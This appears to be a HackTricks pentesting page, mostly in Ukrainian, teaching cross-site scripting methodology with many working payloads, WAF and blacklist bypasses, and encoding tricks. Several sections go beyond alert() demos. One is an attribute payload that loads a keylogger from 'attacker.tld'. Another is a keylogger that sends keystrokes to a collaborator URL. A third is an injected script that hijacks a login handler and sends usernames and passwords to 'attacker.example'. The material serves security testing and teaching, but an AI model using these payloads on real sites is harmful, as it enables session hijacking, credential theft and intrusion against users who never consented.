# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Перевірте, чи **будь-яке значення, яке ви контролюєте** (_parameters_, _path_, _headers_?, _cookies_?) **відображається** в HTML або **використовується** кодом **JS**.
2. **З'ясуйте контекст**, у якому воно відображається/використовується.
3. Якщо **відображається**
1. Перевірте **які символи ви можете використати** і, в залежності від цього, підготуйте payload:
1. В **raw HTML**:
1. Чи можете ви створити нові HTML теги?
2. Чи можете ви використати події або атрибути, що підтримують протокол `javascript:`?
3. Чи можете ви обійти захист?
4. Чи інтерпретується HTML-контент якимось клієнтським JS-рушієм (_AngularJS_, _VueJS_, _Mavo_...), у такому випадку ви могли б зловживати [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Якщо ви не можете створити HTML теги, що виконують JS-код, чи можна зловживати [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Всередині **HTML tag**:
1. Чи можете ви вийти у raw HTML контекст?
2. Чи можете ви створити нові події/атрибути для виконання JS-коду?
3. Чи підтримує атрибут, у якому ви обмежені, виконання JS-коду?
4. Чи можете ви обійти захист?
3. Всередині **JavaScript code**:
1. Чи можете ви вийти за межі тегу `<script>`?
2. Чи можете ви вийти з рядка і виконати інший JS-код?
3. Чи міститься ваш ввід у template literals ``?
4. Чи можете ви обійти захист?
4. Javascript **function**, що **виконується**
1. Ви можете вказати ім'я функції для виконання. Наприклад: `?callback=alert(1)`
4. Якщо **використовується**:
1. Ви можете експлуатувати **DOM XSS** — зверніть увагу, як контролюється ваш ввід і чи використовується ваш контрольований ввід яким-небудь sink.

Коли працюєте над складним XSS, вам може бути корисно дізнатися про:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Відображені значення

Щоб успішно експлуатувати XSS, перше, що потрібно знайти — це **значення, яке ви контролюєте і яке відображається** на веб-сторінці.

- **Intermediately reflected**: Якщо ви виявите, що значення параметра або навіть path відображається на сторінці, ви можете експлуатувати **Reflected XSS**.
- **Stored and reflected**: Якщо значення, яке ви контролюєте, зберігається на сервері і відображається щоразу при доступі до сторінки, ви можете експлуатувати **Stored XSS**.
- **Accessed via JS**: Якщо значення, яке ви контролюєте, отримується за допомогою JS, ви можете експлуатувати **DOM XSS**.

## Контексти

Коли намагаєтеся експлуатувати XSS, перше, що потрібно знати — **де відображається ваш ввід**. Залежно від контексту, ви зможете виконувати довільний JS-код різними способами.

### Raw HTML

Якщо ваш ввід **відображається у raw HTML** сторінці, вам потрібно зловживати певним **HTML tag**, щоб виконати JS-код: `<img , <iframe , <svg , <script` ... це лише декілька з багатьох можливих HTML тегів, які ви можете використати.\
Також майте на увазі [Client Side Template Injection](../client-side-template-injection-csti.md).

### Всередині атрибуту HTML тега

Якщо ваш ввід відображається всередині значення атрибуту тега, ви можете спробувати:

1. **Вийти з атрибуту і з тега** (тоді ви опинитесь у raw HTML) і створити новий HTML тег для зловживання: `"><img [...]`
2. Якщо ви **можете вийти з атрибуту, але не з тега** (`>` кодується або видаляється), залежно від тега ви можете **створити подію**, що виконує JS-код: `" autofocus onfocus=alert(1) x="`
3. Якщо ви **не можете вийти з атрибуту** (`"` кодується або видаляється), то в залежності від **якого атрибута** ваше значення відображається і чи контролюєте ви весь вміст або лише частину, ви зможете ним зловживати. Наприклад, якщо ви контролюєте подію на кшталт `onclick=` ви зможете змусити її виконати довільний код при кліку. Інший цікавий приклад — атрибут `href`, де можна використати протокол `javascript:` для виконання довільного коду: **`href="javascript:alert(1)"`**
4. Якщо ваш ввід відображається всередині "unexpoitable tags" ви можете спробувати трюк з **`accesskey`** для зловживання вразливістю (потрібна соціальна інженерія для експлуатації): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

A corporate SSO login page reflected the OAuth `service` parameter inside the `href` attribute of `<a id="forgot_btn" ...>`. Even though `<` and `>` were HTML-encoded, double quotes were not, so the attacker could close the attribute and reuse the same element to inject handlers such as `" onfocus="payload" x="`.

1. **Inject the handler:** Simple payloads like `onclick="print(1)"` were blocked, but the WAF only inspected the first JavaScript statement in inline attributes. Prefixing a harmless expression wrapped in parentheses, then a semicolon, allowed the real payload to execute: `onfocus="(history.length);malicious_code_here"`.
2. **Auto-trigger it:** Browsers focus any element whose `id` matches the fragment, so appending `#forgot_btn` to the exploit URL forces the anchor to focus on page load and runs the handler without requiring a click.
3. **Keep the inline stub tiny:** The target already shipped jQuery. The handler only needed to bootstrap a request via `$.getScript(...)` while the full keylogger lived on the attacker's server.

**Building strings without quotes**

Single quotes were returned URL-encoded and escaped double quotes corrupted the attribute, so the payload generated every string with `String.fromCharCode`. A helper function makes it easy to convert any URL into char codes before pasting it into the attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Отриманий атрибут виглядав так:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Чому це викрадає облікові дані**

Зовнішній скрипт (завантажений з хоста, контрольованого атакуючим, або з Burp Collaborator) перехоплював `document.onkeypress`, буферизував натискання клавіш і щосекунди відправляв `new Image().src = collaborator_url + keys`. Оскільки XSS спрацьовує лише для неавторизованих користувачів, чутливою дією є сама форма входу — атакуючий зчитує usernames і passwords навіть якщо жертва ніколи не натискає "Login".

Дивний приклад того, як Angular виконує XSS, якщо ви контролюєте class name:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Всередині JavaScript-коду

У цьому випадку ваше введення відображається між **`<script> [...] </script>`** тегами HTML-сторінки, всередині файлу `.js` або всередині атрибута, який використовує протокол **`javascript:`**:

- Якщо відображається між **`<script> [...] </script>`** тегами, навіть якщо ваше введення знаходиться в будь-якого роду лапках, можна спробувати вставити `</script>` і вийти з цього контексту. Це працює, тому що **браузер спочатку розпарсить HTML-теги**, а потім вміст, отже, він не помітить, що ваш інжектований `</script>` тег знаходиться всередині HTML-коду.
- Якщо відображається **всередині JS string** і останній трюк не працює, вам потрібно **вийти** з рядка, **виконати** ваш код та **відновити** JS-код (if there is any error, it won't be executed:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Якщо відображається всередині шаблонних літералів, ви можете **вбудовувати JS-вирази** використовуючи синтаксис `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** works to write **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting означає можливість **оголошувати функції, змінні або класи після їх використання, щоб можна було зловживати сценаріями, де XSS використовує неоголошені змінні або функції.**\
**Check the following page for more info:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Several web pages have endpoints that **accept as parameter the name of the function to execute**. A common example to see in the wild is something like: `?callback=callbackFunc`.

A good way to find out if something given directly by the user is trying to be executed is **modifying the param value** (for example to 'Vulnerable') and looking in the console for errors like:

![](<../../images/image (711).png>)

In case it's vulnerable, you could be able to **trigger an alert** just doing sending the value: **`?callback=alert(1)`**. However, it' very common that this endpoints will **validate the content** to only allow letters, numbers, dots and underscores (**`[\w\._]`**).

However, even with that limitation it's still possible to perform some actions. This is because you can use that valid chars to **access any element in the DOM**:

![](<../../images/image (747).png>)

Some useful functions for this:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Ви також можете спробувати безпосередньо викликати **Javascript functions**: `obj.sales.delOrders`.

Однак зазвичай the endpoints, які виконують вказану функцію, — це endpoints без дуже цікавого DOM; **інші сторінки в тому ж same origin** матимуть **більш цікавий DOM** для виконання додаткових дій.

Тому, щоб **зловживати цією вразливістю в іншому DOM**, було розроблено експлуатацію **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Існує **JS code**, що **незахищено** використовує деякі **дані, контрольовані атакуючим**, наприклад `location.href`. Атакуючий може зловживати цим для виконання довільного JS-коду.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Ці види XSS можна знайти **скрізь**. Вони не залежать тільки від клієнтської експлуатації веб-застосунку, а від **будь-якого** **контексту**. Таке **виконання довільного JavaScript** може навіть бути використане для отримання **RCE**, читання **довільних** **файлів** на клієнтах і серверах та іншого.\
Деякі **приклади**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Коли ваш ввід відображається **inside the HTML page** або ви можете уникнути екранування та інжектити HTML-код у цьому контексті, **перше**, що потрібно зробити — перевірити, чи можна зловживати символом `<` для створення нових тегів: просто спробуйте **reflect** цей **char** і перевірте, чи він **HTML encoded** або **deleted**, або чи він **reflected without changes**. **Лише в останньому випадку ви зможете експлуатувати цю ситуацію**.\
For this cases also **keep in mind** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\ _**Note: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_

У цьому випадку, якщо не використовується чорний/білий список, ви можете використовувати payloads типу:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Але, якщо використовується tags/attributes black/whitelisting, вам доведеться **brute-force which tags**.\
Після того як ви **located which tags are allowed**, вам потрібно буде **brute-force attributes/events** всередині знайдених валідних tags, щоб з’ясувати, як можна атакувати контекст.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Потім відправте їх усі за допомогою Burp intruder і перевірте, чи який-небудь tags не був визнаний шкідливим WAF. Після того як ви виявите, які tags можете використовувати, ви можете **brute force all the events** використовуючи валідні tags (на тій же web page натисніть _**Copy events to clipboard**_ і повторіть ту ж процедуру).

### Custom tags

Якщо ви не знайшли жодного валідного HTML tag, ви можете спробувати **create a custom tag** і виконати JS код з атрибутом `onfocus`. У XSS request потрібно закінчити URL символом `#`, щоб сторінка **focus on that object** і **execute** код:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Якщо використовується якийсь blacklist, ви можете спробувати обійти його за допомогою кількох простих трюків:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (малих XSSs)

> [!NOTE] > **Більше tiny XSS для різних середовищ** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) and [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Останній використовує 2 символи Unicode, які розширюються до 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Якщо для експлуатації вразливості вам потрібно, щоб **користувач клікнув по посиланню або формі** з попередньо заповненими даними, ви можете спробувати [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (якщо сторінка вразлива).

### Impossible - Dangling Markup

Якщо ви просто вважаєте, що **неможливо створити HTML tag з атрибутом для виконання JS code**, перевірте [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html), бо ви можете **експлуатувати** вразливість **без** виконання **JS** коду.

## Інжекція всередині HTML tag

### Всередині тегу / вихід зі значення атрибута

Якщо ви знаходитесь **всередині HTML tag**, перше, що варто спробувати — це **вийти** з тегу і використати деякі техніки, згадані у [previous section](#injecting-inside-raw-html), щоб виконати JS code.\
Якщо ви **не можете вийти з тегу**, ви можете створити нові атрибути всередині тегу, щоб спробувати виконати JS code, наприклад використовуючи payload на кшталт ( _зауважте, що в цьому прикладі подвійні лапки використовуються, щоб вийти з атрибута; вони не знадобляться, якщо ваш ввід відображається безпосередньо всередині тегу_ ):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Події стилю**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Всередині атрибуту

Навіть якщо ви **не можете вийти з атрибуту** (`"` кодується або видаляється), залежно від того, **в якому атрибуті** відображається ваше значення і **чи ви контролюєте все значення або лише його частину**, ви зможете ним зловживати. Наприклад, якщо ви контролюєте подію, таку як `onclick=`, ви зможете змусити її виконати довільний код при натисканні.\
Інший цікавий приклад — атрибут `href`, де можна використовувати протокол `javascript:` для виконання довільного коду: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Символи, **HTML encoded characters** всередині значення атрибутів HTML-тегів **декодуються під час виконання**. Тому щось на кшталт наведеного нижче буде валідним (payload виділено жирним): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Зауважте, що **будь-який вид HTML encode є дійсним**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Зверніть увагу, що URL encode також працюватиме:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass всередині event з використанням Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Спеціальні протоколи в атрибуті

Тут ви можете використовувати протоколи **`javascript:`** або **`data:`** у деяких місцях, щоб **виконати довільний JS-код**. Деякі з них вимагатимуть взаємодії користувача, а деякі — ні.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Місця, де можна inject ці протоколи**

**Загалом** протокол `javascript:` може бути **використаний у будь-якому тегу, який приймає атрибут `href`** і в **більшості** тегів, які приймають **атрибут `src`** (але не `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Інші obfuscation трюки**

_**У цьому випадку трюк HTML-кодування та Unicode-кодування з попереднього розділу також діє, оскільки ви перебуваєте в атрибуті.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Крім того, є ще один **гарний трюк** для таких випадків: **Навіть якщо ваш вхід всередині `javascript:...` URL encoded, він буде URL decoded перед виконанням.** Тож, якщо вам потрібно **вийти** з **рядка** за допомогою **single quote** і ви бачите, що **воно URL encoded**, пам'ятайте, що **це не має значення,** воно буде **інтерпретовано** як **single quote** під час **виконання**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Зверніть увагу, що якщо ви спробуєте **використати обидва** `URLencode + HTMLencode` у будь-якому порядку для кодування **payload**, це **не** **працюватиме**, але ви можете **змішати їх всередині payload**.

**Використання Hex та Octal кодування з `javascript:`**

Ви можете використовувати **Hex** та **Octal кодування** всередині атрибута `src` елемента `iframe` (принаймні) щоб оголосити **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Якщо ви можете інжектувати будь-який URL у довільний тег **`<a href=`**, який містить атрибути **`target="_blank" and rel="opener"`**, перегляньте **наступну сторінку, щоб експлуатувати цю поведінку**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Обхід "on" обробників подій

Насамперед перевірте цю сторінку ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) на предмет корисних **"on" обробників подій**.\
У випадку, якщо існує якийсь blacklist, який перешкоджає вам створювати ці обробники подій, ви можете спробувати наступні обхідні методи:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS у "Unexploitable tags" (hidden input, link, canonical, meta)

From [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **тепер можливо зловживати hidden inputs за допомогою:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
А в **мета-тегах**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
З [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Ви можете виконати **XSS payload inside a hidden attribute**, за умови, що зможете **переконати** **victim** натиснути **комбінацію клавіш**. У Firefox на Windows/Linux комбінація клавіш — **ALT+SHIFT+X**, а на OS X — **CTRL+ALT+X**. Ви можете вказати іншу комбінацію клавіш, використавши іншу клавішу в access key attribute. Ось вектор:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Пейлоуд XSS буде приблизно таким: `" accesskey="x" onclick="alert(1)" x="`**

### Обхід чорного списку

У цьому розділі вже показано кілька трюків з використанням різних кодувань. Поверніться, щоб дізнатись, де можна використовувати:

- **HTML encoding (HTML tags)**
- **Unicode encoding (може бути валідним JS кодом):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Обхід для HTML тегів і атрибутів**

Прочитайте [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Обхід для JavaScript коду**

Прочитайте [JavaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Якщо ви знайшли **XSS у дуже невеликій частині** сайту, яка вимагає певної взаємодії (можливо невелике посилання у footer з елементом onmouseover), ви можете спробувати **змінити простір, який займає цей елемент**, щоб максимізувати ймовірність спрацювання посилання.

Наприклад, ви могли б додати стилі для елемента, наприклад: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Але якщо WAF фільтрує атрибут style, ви можете використовувати CSS Styling Gadgets, тому якщо ви знайдете, наприклад

> .test {display:block; color: blue; width: 100%\}

та

> \#someid {top: 0; font-family: Tahoma;}

Тепер ви можете змінити наше посилання і привести його до форми

> \<a href="" id=someid class=test onclick=alert() a="">

Цей трюк було взято з [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Інжекція всередину JavaScript коду

У цьому випадку ваш **input** буде **відображений всередині JS коду** у `.js` файлі або між тегами `<script>...</script>`, або в HTML-подіях, які можуть виконувати JS код, або в атрибутах, що приймають протокол `javascript:`.

### Вихід із тега \<script>

Якщо ваш код вставляється всередину `<script> [...] var input = 'reflected data' [...] </script>`, ви можете легко **вийти, закривши тег `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Зауважте, що в цьому прикладі ми **навіть не закрили одиночну лапку**. Це тому, що **парсинг HTML спочатку виконується браузером**, що включає визначення елементів сторінки, зокрема блоків скриптів. Парсинг JavaScript для розуміння та виконання вбудованих скриптів виконується лише пізніше.

### Усередині JS-коду

Якщо `<>` санітизуються, ви все одно можете **екранізувати рядок** там, де знаходиться ваш ввід, і **виконати довільний JS**. Важливо **виправити синтаксис JS**, оскільки якщо будуть помилки, JS-код не буде виконано:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Коли введення користувача потрапляє всередину взятого в лапки JavaScript рядка (наприклад, server-side echo у inline script), ви можете завершити рядок, inject code і відновити синтаксис, щоб парсинг залишався коректним. Загальна схема:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Приклад шаблону URL, коли вразливий параметр відображається в рядку JS:
```
?param=test";<INJECTION>;a="
```
Це виконує атакуючий JS без необхідності торкатися HTML-контексту (чистий JS-in-JS). Поєднуйте з blacklist bypasses нижче, коли фільтри блокують ключові слова.

### Літерали шаблонів \`\`

Щоб формувати **рядки**, окрім одинарних і подвійних лапок, JS також підтримує **backticks** **` `` `**. Це відоме як шаблонні літерали, оскільки вони дозволяють вбудовувати **embedded JS expressions** за допомогою синтаксису `${ ... }`.\  
Отже, якщо ви виявите, що ваш ввід **reflected** всередині JS-рядка, який використовує backticks, ви можете зловживати синтаксисом `${ ... }` для виконання **arbitrary JS code**:

Цю можливість можна **зловживати**, використовуючи:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Закодоване виконання коду
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads з eval(atob()) та нюанси scope

Щоб робити URL коротшими і обходити наївні фільтри за ключовими словами, ви можете base64-encode вашу реальну логіку і виконати її через `eval(atob('...'))`. Якщо просте фільтрування за ключовими словами блокує ідентифікатори на кшталт `alert`, `eval` або `atob`, використовуйте Unicode-escaped identifiers, які компілюються однаково в браузері, але обходять фільтри порівняння рядків:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Важлива тонкість з областю видимості: `const`/`let`, оголошені всередині `eval()`, мають блочну область видимості і НЕ створюють globals; вони не будуть доступні для наступних скриптів. Використовуйте динамічно інжектований елемент `<script>`, щоб визначити глобальні, непереназначувані hooks коли це потрібно (наприклад, щоб перехопити обробник форми):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Посилання: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Кодування Unicode для виконання JS
```javascript
alert(1)
alert(1)
alert(1)
```
### Техніки обходу чорних списків у JavaScript

**Рядки**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Спеціальні escapes**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Підстановки пробілів у JS-коді**
```javascript
<TAB>
/**/
```
**JavaScript comments (з** [**JavaScript Comments**](#javascript-comments) **трюку)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript переноси рядків (з** [**JavaScript new line**](#javascript-new-lines) **трюку)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript пробіли**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
